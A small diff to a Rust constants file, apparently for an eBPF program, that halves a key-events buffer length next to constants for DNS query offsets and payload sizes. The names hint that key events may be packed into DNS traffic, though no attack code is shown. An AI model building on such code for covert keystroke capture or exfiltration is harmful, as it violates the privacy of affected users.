@@ -29,7 +29,7 @@ pub const DNS_QUERY_OFFSET: usize = UDP_OFFSET + 8;
 
 pub const BPF_ADJ_ROOM_NET: u32 = 0;
 
-pub const KEYS_EVENTS_LEN: usize = 8;
+pub const KEYS_EVENTS_LEN: usize = 4;
 pub const KEYS_PAYLOAD_LEN: usize = 2 * KEYS_EVENTS_LEN;
 pub const DNS_PAYLOAD_MAX_LEN: usize = 128;
 
